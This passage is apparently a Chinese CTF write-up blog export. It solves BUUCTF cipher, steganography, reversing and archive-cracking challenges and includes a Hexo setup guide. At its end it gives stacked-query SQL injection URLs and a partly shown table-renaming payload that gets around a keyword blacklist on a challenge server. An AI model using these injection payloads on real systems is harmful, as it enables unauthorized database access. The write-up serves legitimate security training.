NBWXO XAW DI DXAN NB NVXAP DXPIMKIZW MBU JIKAH QCEV XA BCNQNXAWKAH VBQN HKFI OBCUQIZFIQ X JKH UBCAW BM XLLZXCQI XAW NVI PIO KQ 640I11012805M211J0XJ24MM02X1IW09</span><br></pre></td></tr></table></figure>\n<p>看题目的意思，应该跟[[凯撒？替换？呵呵!]]这道题的逻辑差不多，主要是词频分析，用<a href=\"https://quipqiup.com/\">quipquip</a>分析一下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">HELLO EVERYBODY THANK YOU ALL RIGHT EVERYBODY GO AHEAD AND HAVE A SEAT HOW IS EVERYBODY DOING TODAY HOW ABOUT TIM SPICER WE ARE HERE WITH STUDENTS AT WAKEFIELD HIGH SCHOOL IN ARLINGTON VIRGINIA AND WE HAVE GOT STUDENTS TUNING IN FROM ALL ACROSS AMERICA FROM KINDERGARTEN THROUGH 12TH GRADE AND WE ARE JUST SO GLAD THAT ALL COULD JOIN US TODAY AND WE WANT TO THANK WAKEFIELD FOR BEING SUCH AN OUTSTANDING HOST GIVE YOURSELVES A BIG ROUND OF APPLAUSE AND THE KEY IS 640E11012805F211B0AB24FF02A1ED09</span><br></pre></td></tr></table></figure>\n<p><em>这种题目就是比拼谁的网站好用XD</em><br>flag:<del>flag{640e11012805f211b0ab24ff02a1ed09}</del></p>\n","categories":["Crypto","凯撒密码","词频分析"]},{"title":"丢失的MD5","url":"/2021/08/26/%E4%B8%A2%E5%A4%B1%E7%9A%84MD5/","content":"<p><a href=\"https://buuoj.cn/challenges#%E4%B8%A2%E5%A4%B1%E7%9A%84MD5\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>附件下载，得到程序代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashlib   </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">32</span>,<span class=\"number\">127</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">32</span>,<span class=\"number\">127</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">32</span>,<span class=\"number\">127</span>):</span><br><span class=\"line\">            m=hashlib.md5()</span><br><span class=\"line\">            m.update(<span class=\"string\">&#x27;TASC&#x27;</span>+<span class=\"built_in\">chr</span>(i)+<span class=\"string\">&#x27;O3RJMV&#x27;</span>+<span class=\"built_in\">chr</span>(j)+<span class=\"string\">&#x27;WDJKX&#x27;</span>+<span class=\"built_in\">chr</span>(k)+<span class=\"string\">&#x27;ZM&#x27;</span>)</span><br><span class=\"line\">            des=m.hexdigest()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&#x27;e9032&#x27;</span> <span class=\"keyword\">in</span> des <span class=\"keyword\">and</span> <span class=\"string\">&#x27;da&#x27;</span> <span class=\"keyword\">in</span> des <span class=\"keyword\">and</span> <span class=\"string\">&#x27;911513&#x27;</span> <span class=\"keyword\">in</span> des:</span><br><span class=\"line\">                <span class=\"built_in\">print</span> des</span><br></pre></td></tr></table></figure>\n<p>VScode打开来直接红波浪线了，看起来像是语法错误，改一下语法，加一下编码设置：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashlib   </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">32</span>,<span class=\"number\">127</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">32</span>,<span class=\"number\">127</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">32</span>,<span class=\"number\">127</span>):</span><br><span class=\"line\">            m=hashlib.md5()</span><br><span class=\"line\">            m.update(<span class=\"built_in\">bytes</span>((<span class=\"string\">&#x27;TASC&#x27;</span>+<span class=\"built_in\">chr</span>(i)+<span class=\"string\">&#x27;O3RJMV&#x27;</span>+<span class=\"built_in\">chr</span>(j)+<span class=\"string\">&#x27;WDJKX&#x27;</span>+<span class=\"built_in\">chr</span>(k)+<span class=\"string\">&#x27;ZM&#x27;</span>).encode(<span class=\"string\">&quot;utf-8&quot;</span>)))</span><br><span class=\"line\">            des=m.hexdigest()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&#x27;e9032&#x27;</span> <span class=\"keyword\">in</span> des <span class=\"keyword\">and</span> <span class=\"string\">&#x27;da&#x27;</span> <span class=\"keyword\">in</span> des <span class=\"keyword\">and</span> <span class=\"string\">&#x27;911513&#x27;</span> <span class=\"keyword\">in</span> des:</span><br><span class=\"line\">                <span class=\"built_in\">print</span> (des)</span><br></pre></td></tr></table></figure>\n<p>运行程序便得到了flag的数据。<br>flag:<del>flag{e9032994dabac08080091151380478a2}</del></p>\n","categories":["Crypto"]},{"title":"乌镇峰会种图","url":"/2021/08/25/%E4%B9%8C%E9%95%87%E5%B3%B0%E4%BC%9A%E7%A7%8D%E5%9B%BE/","content":"<p><a href=\"https://buuoj.cn/challenges#%E4%B9%8C%E9%95%87%E5%B3%B0%E4%BC%9A%E7%A7%8D%E5%9B%BE\">题目链接</a><br>题目的附件下载下来就是图片文件了，打开来看了一下，肉眼应该是没有问题，用[[Stegsolve]分析一下：<br>![](/images/Writeup/20210825145323.png]<br>看来文件尾的数据转换为ASCII就出来了，得到了flag：<del>flag{97314e7864a8f6262 7b26f3f9  98c37f1}</del></p>\n","categories":["Misc","图片隐写"]},{"title":"传统知识+古典密码","url":"/2021/08/26/%E4%BC%A0%E7%BB%9F%E7%9F%A5%E8%AF%86+%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/","content":"<p><a href=\"https://buuoj.cn/challenges#%E4%BC%A0%E7%BB%9F%E7%9F%A5%E8%AF%86+%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>附件下载，得到题目：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">小明某一天收到一封密信，信中写了几个不同的年份</span><br><span class=\"line\">          辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。</span><br><span class=\"line\">          信的背面还写有“+甲子”，请解出这段密文。</span><br><span class=\"line\"></span><br><span class=\"line\">key值：CTF&#123;XXX&#125;</span><br></pre></td></tr></table></figure>\n<p>通过对照表知道数据：<br><img src=\"/images/Writeup/20180718185218133.jpg\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">88 90 83 68 77 70 76 90</span><br></pre></td></tr></table></figure>\n<p>转换为ASCII得到：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">XZSDMFLZ</span><br></pre></td></tr></table></figure>\n<p>题目里面又提到涉及古典加密，看一下，不大像栅栏加密，试试凯撒加密，就得到了flag：<br>flag:<del>flag{SHUANGYU}</del><br>附件里面还有一个压缩包，解压看看：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">5555555595555A65556AA696AA6666666955</span><br><span class=\"line\">这是某压力传感器无线数据包解调后但未解码的报文(hex)</span><br><span class=\"line\">  </span><br><span class=\"line\">已知其ID为0xFED31F，请继续将报文完整解码，提交hex。</span><br><span class=\"line\"></span><br><span class=\"line\">提示1：曼联</span><br></pre></td></tr></table></figure>\n\n","categories":["Crypto","凯撒密码"]},{"title":"你竟然赶我走","url":"/2021/08/25/%E4%BD%A0%E7%AB%9F%E7%84%B6%E8%B5%B6%E6%88%91%E8%B5%B0/","content":"<p><a href=\"https://buuoj.cn/challenges#%E4%BD%A0%E7%AB%9F%E7%84%B6%E8%B5%B6%E6%88%91%E8%B5%B0\">题目链接</a><br>附件下载解压，得到的是一张图片：biubiu.jpg,打开来看的话能发现右下角有阴影，怀疑是图片隐写了数据：<br>![[biubiu.jpg]<br>用[[Stegsolve]打开来看一下文件头，在ASCII编码区看到了flag数据<br>![](/images/Writeup/20210825112927.png]<br>就得到了flag：<del>flag{stego_ is_s0_bor1ing}</del></p>\n","categories":["Misc","图片隐写"]},{"title":"信息化时代的步伐","url":"/2021/08/26/%E4%BF%A1%E6%81%AF%E5%8C%96%E6%97%B6%E4%BB%A3%E7%9A%84%E6%AD%A5%E4%BC%90/","content":"<p><a href=\"https://buuoj.cn/challenges#%E4%BF%A1%E6%81%AF%E5%8C%96%E6%97%B6%E4%BB%A3%E7%9A%84%E6%AD%A5%E4%BC%90\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>附件下载，得到密文：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">606046152623600817831216121621196386</span><br></pre></td></tr></table></figure>\n<p>在线解码中文电码<a href=\"http://code.mcdvisa.com/\">在线工具</a>，得到flag。<br>flag:<del>flag{计算机要从娃娃抓起}</del></p>\n","categories":["Crypto"]},{"title":"内涵的软件","url":"/2021/08/26/%E5%86%85%E6%B6%B5%E7%9A%84%E8%BD%AF%E4%BB%B6/","content":"<p><a href=\"https://buuoj.cn/challenges#%E5%86%85%E6%B6%B5%E7%9A%84%E8%BD%AF%E4%BB%B6\">题目链接</a><br>拖进IDA分析一下：<br><img src=\"/images/Writeup/20210826210317.png\"><br>F5逆向一下看看：<br><img src=\"/images/Writeup/20210826210341.png\"><br><img src=\"/images/Writeup/20210826210546.png\"><br>看程序逻辑是没有找到啥核心数据，倒是上面的：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">v5 = <span class=\"string\">&quot;DBAPP&#123;49d3c93df25caad81232130f3d2ebfad&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>\n<p>抱着试一试的态度，改了一下格式上交，居然过了。。<br>flag:<del>flag{49d3c93df25caad81232130f3d2ebfad}</del></p>\n","categories":["Reserve"]},{"title":"凯撒？替换？呵呵!","url":"/2021/08/26/%E5%87%AF%E6%92%92%EF%BC%9F%E6%9B%BF%E6%8D%A2%EF%BC%9F%E5%91%B5%E5%91%B5!/","content":"<p><a href=\"https://buuoj.cn/challenges#%E5%87%AF%E6%92%92%EF%BC%9F%E6%9B%BF%E6%8D%A2%EF%BC%9F%E5%91%B5%E5%91%B5!\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>密文：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">MTHJ&#123;CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO&#125;</span><br></pre></td></tr></table></figure>\n<p>题目有说到存在凯撒密码，并且存在替换，就先研究前四个字符：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">密文     M  T  H  J</span><br><span class=\"line\">ASCII  77  84 72 74</span><br><span class=\"line\">明文1    F  L  A  G</span><br><span class=\"line\">ASCII  70  76 65 71</span><br><span class=\"line\">明文2    f  l  a  g</span><br><span class=\"line\">ASCII  102 108 97 103 </span><br></pre></td></tr></table></figure>\n<p>没有思路。。百度上看了，全是<a href=\"https://quipqiup.com/\">quipquip</a>在线解出来的，绝了。。<br>flag:<del>flag{substitutioncipherdecryptionisalwayseasyjustlikeapieceofcake}</del><br>这道题就不用纠结怎么做了，应该没有正常的做法。。<br>分析程序：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s1=<span class=\"string\">&quot;MTHJ&#123;CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO&#125;&quot;</span></span><br><span class=\"line\">s2=<span class=\"string\">&quot;flag&#123;substitutioncipherdecryptionisalwayseasyjustlikeapieceofcake&#125;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> letter <span class=\"keyword\">in</span> s1:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">ord</span>(letter),end=<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n\\n&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> letter <span class=\"keyword\">in</span> s2:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">ord</span>(letter),end=<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n\\n&quot;</span>)</span><br><span class=\"line\">i:<span class=\"built_in\">int</span>=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> i&lt;<span class=\"built_in\">len</span>(s1):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">ord</span>(s1[i])-<span class=\"built_in\">ord</span>(s2[i]),end=<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\">    i+=<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>输出的结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">77 84 72 74 123 67 85 66 67 71 88 71 85 71 88 87 82 69 88 73 80 79 89 65 79 69 89 70 73 71 88 87 82 88 67 72 84 75 72 70 67 79 72 67 70 68 85 67 71 84 88 90 79 72 73 88 79 69 79 87 77 69 72 90 79 125 </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">102 108 97 103 123 115 117 98 115 116 105 116 117 116 105 111 110 99 105 112 104 101 114 100 101 99 114 121 112 116 105 111 110 105 115 97 108 119 97 121 115 101 97 115 121 106 117 115 116 108 105 107 101 97 112 105 101 99 101 111 102 99 97 107 101 125 </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">-25 -24 -25 -29 0 -48 -32 -32 -48 -45 -17 -45 -32 -45 -17 -24 -28 -30 -17 -39 -24 -22 -25 -35 -22 -30 -25 -51 -39 -45 -17 -24 -28 -17 -48 -25 -24 -44 -25 -51 -48 -22 -25 -48 -51 -38 -32 -48 -45 -24 -17 -17 -22 -25 -39 -17 -22 -30 -22 -24 -25 -30 -25 -17 -22 0 </span><br></pre></td></tr></table></figure>\n<p>或者用这套脚本分析起来也不错：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s1=<span class=\"string\">&quot;MTHJ&#123;CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO&#125;&quot;</span></span><br><span class=\"line\">s2=<span class=\"string\">&quot;flag&#123;substitutioncipherdecryptionisalwayseasyjustlikeapieceofcake&#125;&quot;</span></span><br><span class=\"line\">i:<span class=\"built_in\">int</span>=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> i&lt;<span class=\"built_in\">len</span>(s1):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;s1=&quot;</span>+s1[i]+<span class=\"string\">&quot;--&gt;&quot;</span>+<span class=\"built_in\">str</span>(<span class=\"built_in\">ord</span>(s1[i]))+<span class=\"string\">&quot;  s2=&quot;</span>+s2[i]+<span class=\"string\">&quot;--&gt;&quot;</span>+<span class=\"built_in\">str</span>(<span class=\"built_in\">ord</span>(s2[i]))+<span class=\"string\">&quot;   move=&quot;</span>+<span class=\"built_in\">str</span>(<span class=\"built_in\">ord</span>(s1[i])-<span class=\"built_in\">ord</span>(s2[i])))</span><br><span class=\"line\">    i+=<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n","categories":["Crypto","凯撒密码","词频分析"]},{"title":"刷新过的图片","url":"/2021/09/08/%E5%88%B7%E6%96%B0%E8%BF%87%E7%9A%84%E5%9B%BE%E7%89%87/","content":"<p><a href=\"https://buuoj.cn/challenges#%E5%88%B7%E6%96%B0%E8%BF%87%E7%9A%84%E5%9B%BE%E7%89%87\">题目链接</a><br>附件下载解压，得到一张图片：<br>![](/images/Writeup/20210908154247.png]<br>根据题目提示，使用[[F5-steganography]读取F5刷新缓存的文件：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">java Extract Misc.jpg</span><br></pre></td></tr></table></figure>\n<p>得到output.txt文件，直接打开i，发现开头是PK，直接改文件后缀名为zip：<br>![](/images/Writeup/20210908155839.png]<br>解压，得到flag。<br>flag:<del>flag{96efd0a2037d06f34199e921079778ee}</del></p>\n<hr>\n<p>#Misc #Misc/F5隐写 #Misc/图片隐写<br>2021-09-08</p>\n","categories":["Misc","图片隐写","F5隐写"]},{"title":"变异凯撒","url":"/2021/08/26/%E5%8F%98%E5%BC%82%E5%87%AF%E6%92%92/","content":"<p><a href=\"https://buuoj.cn/challenges#%E5%8F%98%E5%BC%82%E5%87%AF%E6%92%92\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>附件下载解压，得到密文：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">afZ_r9VYfScOeO_UL^RWUc</span><br></pre></td></tr></table></figure>\n<p>结合题目，用前四位字符与“flag”做一下对比：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">加密密文：a  f   Z  _</span><br><span class=\"line\">        97 102 90 95</span><br><span class=\"line\">格式：flag&#123; &#125;</span><br><span class=\"line\">       102 108 97 103</span><br><span class=\"line\">偏移量：  5  6   7  8</span><br></pre></td></tr></table></figure>\n<p>因此用python写一个脚本计算：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s1=<span class=\"string\">&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span></span><br><span class=\"line\">s2:<span class=\"built_in\">str</span>=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">i:<span class=\"built_in\">int</span>=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> i&lt;<span class=\"built_in\">len</span>(s1):</span><br><span class=\"line\">\ts2+=<span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(s1[i])+<span class=\"number\">5</span>+i)</span><br><span class=\"line\"> \ti+=<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(s2)</span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{Caesar_variation}</del></p>\n","categories":["Crypto","凯撒密码"]},{"title":"喵喵喵","url":"/2021/09/07/%E5%96%B5%E5%96%B5%E5%96%B5/","content":"<p><a href=\"https://buuoj.cn/challenges#%E5%96%B5%E5%96%B5%E5%96%B5\">题目链接</a><br>附件下载解压，得到一张png文件：<br>![](/images/Writeup/20210907094245.png]<br>![](/images/Writeup/20210907094304.png]<br>文件属性里面没有东西，用[[Stegsolve]看一下：<br>![](/images/Writeup/20210907094411.png]<br>在plane 0里面发现特殊数据，导出来看一下头：<br>![](/images/Writeup/20210907094750.png]<br>导出，顺便[[010Editor]修一下文件头：<br>![](/images/Writeup/20210907094854.png]<br>![](/images/Writeup/20210907095251.png]<br>发现还是无法正常打开，尝试CRC校验重新计算一下，得到正确的照片高度：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">misc = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;D:\\\\Downloads\\\\3057c969-4df0-45d9-af85-e58b58647059\\\\无标题1.png&quot;</span>,<span class=\"string\">&quot;rb&quot;</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1024</span>):</span><br><span class=\"line\">    data = misc[<span class=\"number\">12</span>:<span class=\"number\">20</span>] +struct.pack(<span class=\"string\">&#x27;&gt;i&#x27;</span>,i)+ misc[<span class=\"number\">24</span>:<span class=\"number\">29</span>]</span><br><span class=\"line\">    crc32 = binascii.crc32(data) &amp; <span class=\"number\">0xffffffff</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> crc32 == <span class=\"number\">0x08ec7edb</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> (i)</span><br></pre></td></tr></table></figure>\n<p>得到输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">280</span><br></pre></td></tr></table></figure>\n<p>![](/images/Writeup/20210907095642.png]<br>二维码识别一下：<br>![](/images/Writeup/20210907095724.png]<br>得到一个链接：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://pan.baidu.com/s/1pLT2J4f</span><br></pre></td></tr></table></figure>\n<p>![](/images/Writeup/20210907095848.png]<br>下载附件，NTFS流读取，pyc逆向，得到flag<br><em>我是实在不想用百度网盘，慢死人</em><br>flag:<del>flag{Y@e_Cl3veR_C1Ever!}</del></p>\n<hr>\n<p>参考：<br>1.<a href=\"https://blog.csdn.net/mochu7777777/article/details/109368451\">BUUCTF：喵喵喵</a></p>\n","categories":["Misc","图片隐写","NTFS数据流","Reverse","pyc"]},{"title":"如何建站","url":"/2021/09/17/%E5%A6%82%E4%BD%95%E5%BB%BA%E7%AB%99/","content":"<blockquote>\n<p>Hexo是一个基于nodejs 的快速生成静态博客的开源框架，而Github Pages是Github运营的一个静态网站托管服务，两者都是免费而灵活的开源项目，二者相结合便可以快速灵活地搭建属于自己的博客网站。</p>\n</blockquote>\n<span id=\"more\"></span>\n<blockquote>\n<p>以下教程适用于Windows平台</p>\n</blockquote>\n<h1 id=\"本地Hexo配置\"><a href=\"#本地Hexo配置\" class=\"headerlink\" title=\"本地Hexo配置\"></a>本地Hexo配置</h1><p>首先，先配置环境：</p>\n<ol>\n<li><p>安装Node.js <a href=\"https://nodejs.org/zh-cn/\">https://nodejs.org/zh-cn/</a> ，基本上装LTS版本，然后一路下一步就可以</p>\n</li>\n<li><p>安装Git <a href=\"https://git-scm.com/\">https://git-scm.com/</a> ，这一步主要用来与Github Page同步</p>\n</li>\n<li><p>验证环境：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">node -v # 用于检验Node的安装</span><br><span class=\"line\">npm -v # 检验npm包管理器的安装</span><br><span class=\"line\">git --version # 检验Git的安装</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 以上三个命令只要返回了版本号，就基本上没有问题了</span></span><br></pre></td></tr></table></figure>\n\n<p>在这里贴上我的返回：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\24743&gt;node -v</span><br><span class=\"line\">v14.17.3</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Users\\24743&gt;npm -v</span><br><span class=\"line\">6.14.13</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Users\\24743&gt;git --version</span><br><span class=\"line\">git version 2.32.0.windows.2</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 版本号不一样没事，有返回值一般就没问题（也别用远古版本）</span></span><br></pre></td></tr></table></figure></li>\n</ol>\n<p>然后安装Hexo：</p>\n<ol>\n<li><p>打开Hexo官方网站：Hexo的官方网站是：<a href=\"https://hexo.io/zh-cn/\">https://hexo.io/zh-cn/</a></p>\n</li>\n<li><p>根据网页信息，依次执行以下命令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install -g hexo-cli #安装Hexo本体</span><br><span class=\"line\">hexo init &lt;folder&gt; # &lt;folder&gt;是你要存放Hexo文件的文件夹的路径</span><br><span class=\"line\">cd &lt;folder&gt; # 切换进Hexo文件夹</span><br><span class=\"line\">npm install # 加载npm相关文件</span><br></pre></td></tr></table></figure></li>\n<li><p>打开Hexo文件夹内的<kbd>_config.yml</kbd>文件，按照</p>\n</li>\n</ol>\n","categories":["Basic"]},{"title":"小明的保险箱","url":"/2021/08/30/%E5%B0%8F%E6%98%8E%E7%9A%84%E4%BF%9D%E9%99%A9%E7%AE%B1/","content":"<p><a href=\"https://buuoj.cn/challenges#%E5%B0%8F%E6%98%8E%E7%9A%84%E4%BF%9D%E9%99%A9%E7%AE%B1\">题目链接</a><br>附件是一张jpg，用[[Stegsolve]看了一下，文件信息里面带有rar的特征，用[[Binwalk]或者[[Foremost]提取一下看看：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">randark@randark-VirtualBox:~/CTF$ binwalk -e 2.jpg</span><br><span class=\"line\"></span><br><span class=\"line\">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class=\"line\">--------------------------------------------------------------------------------</span><br><span class=\"line\">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class=\"line\">30            0x1E            TIFF image data, big-endian, offset of first image directory: 8</span><br><span class=\"line\"></span><br><span class=\"line\">WARNING: Extractor.execute failed to run external extractor &#x27;unrar e &#x27;%e&#x27;&#x27;: [Errno 2] No such file or directory: &#x27;unrar&#x27;, &#x27;unrar e &#x27;%e&#x27;&#x27; might not be installed correctly</span><br><span class=\"line\"></span><br><span class=\"line\">WARNING: Extractor.execute failed to run external extractor &#x27;unrar -x &#x27;%e&#x27;&#x27;: [Errno 2] No such file or directory: &#x27;unrar&#x27;, &#x27;unrar -x &#x27;%e&#x27;&#x27; might not be installed correctly</span><br><span class=\"line\">79903         0x1381F         RAR archive data, version 4.x, first volume type: MAIN_HEAD</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>便得到了一个rar，结合题干，用[[ARCHPR]暴力一下，得到文件：<br>![](/images/Writeup/20210825173849.png]<br>flag:    <del>flag{75a3d68bf071ee188c418ea6cf0bb043}</del></p>\n","categories":["Misc","压缩包破解"]},{"title":"强网杯 2019-随便注","url":"/2021/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF%202019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/","content":"<p><a href=\"https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>我分配到的主机是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://8ddd8c57-b300-4ec8-9e1a-7a8604b29842.node4.buuoj.cn:81</span><br></pre></td></tr></table></figure>\n<p>尝试一下1，看看返回：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://8ddd8c57-b300-4ec8-9e1a-7a8604b29842.node4.buuoj.cn:81/?inject=1</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Writeup/20210826100616.png\"><br>用字符类注入试试：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://8ddd8c57-b300-4ec8-9e1a-7a8604b29842.node4.buuoj.cn:81/?inject=1&#x27;or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Writeup/20210826100954.png\"><br>看来可以用字符类注入，看看SQL语句，让它返回一下数据库：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://8ddd8c57-b300-4ec8-9e1a-7a8604b29842.node4.buuoj.cn:81/?inject=1%27;show%20databases;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Writeup/20210826101322.png\"><br>再看一下数据表名字：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://8ddd8c57-b300-4ec8-9e1a-7a8604b29842.node4.buuoj.cn:81/?inject=1%27;show%20tables;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Writeup/20210826101401.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://8ddd8c57-b300-4ec8-9e1a-7a8604b29842.node4.buuoj.cn:81/?inject=1&#x27;;select columns from `1919810931114514`;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Writeup/20210826101522.png\"></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>\n<p>看来是加了字符过滤。。用show看看：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://8ddd8c57-b300-4ec8-9e1a-7a8604b29842.node4.buuoj.cn:81/?inject=1&#x27;;show columns from `1919810931114514`;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Writeup/20210826102007.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://8ddd8c57-b300-4ec8-9e1a-7a8604b29842.node4.buuoj.cn:81/?inject=1%27;show columns from `words`;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Writeup/20210826102058.png\"><br>于是想修改表名，让flag的数据改到word里面：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">-1</span><span class=\"string\">&#x27;;</span></span><br><span class=\"line\"><span class=\"string\">rename table `words` to `test`;</span></span><br><span class=\"line\"><span class=\"string\">rename table `1919810931114514` to `words`;</span></span><br><span class=\"line\"><span class=\"string\">alter table `words` change `flag` `id` varchar(100);</span></span><br><span 